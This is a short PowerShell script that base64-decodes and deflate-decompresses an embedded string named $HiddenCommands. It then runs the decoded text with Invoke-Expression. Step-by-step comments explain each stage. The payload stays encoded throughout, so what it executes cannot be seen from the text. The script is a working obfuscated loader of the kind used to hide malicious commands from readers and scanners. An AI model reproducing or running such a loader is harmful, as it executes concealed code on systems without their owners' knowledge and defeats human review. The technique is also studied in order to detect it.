$HiddenCommands='rZLLTsJgEIXPozQNiRCDxq2GhcFrRCWpuuqm2B8kKYUUFH17vxkqoNEVhtDO7cw5M9OGZsq00Is6aupSAbutJ01V6FUT/Aj/QmP8oEQfmlMRyPTADbAKKvq6V1c3OteDTnWmW13rTi0dYFdg36jreW/DVtrXno6VOjqQzTyeUz+j/xHZE7o28CqUjHhmMHYUE5lq6T3maDZ8ASrovVa6sp6xB2i12eb8LFOC7Lu1RFEJW0SHMe8cRLmuKdEe0bPp/KvdtGA2RRWVI96ZoyKiV0zd1SOzJGCHVC/JWl1KvKj5A//UpzOmsXvJWn/K9laZFOVTJp2AM4UxHIfO9HMXFh/+g6YJz7Z7dhvby8jjXa5f8R3Ypjcq4m8zxFsqhjDl9UQzR31dxbIJvU2BfVuJ3zxQFTlzxL2358jrr2LhF91lw/EvW9ql+1+72vB8Ag=='

#convert data from base64 encoded string into a byte array
$Bytes = [System.Convert]::FromBase64String($HiddenCommands)

#create input memory stream object, fill it with byte array (it is compressed data)
$memStreamObj1 = New-Object System.IO.MemoryStream
$memStreamObj1.Write($Bytes, 0, $Bytes.Length)
$memStreamObj1.Seek(0,0) | Out-Null

#create output memory stream object, fill it with decompressed data
$memStreamObj2 = New-Object System.IO.MemoryStream
$deflStreamObj = New-Object System.IO.Compression.DeflateStream($memStreamObj1, [System.IO.Compression.CompressionMode]::Decompress)
$deflStreamObj.CopyTo($memStreamObj2)
$deflStreamObj.Close()
$memStreamObj1.Close()

#read data from output memory stream, convert to unicode string
$Bytes = $memStreamObj2.ToArray()
$DecodedCommands = [System.Text.Encoding]::Unicode.GetString($Bytes)

#run commands after decoding
Invoke-Expression $DecodedCommands
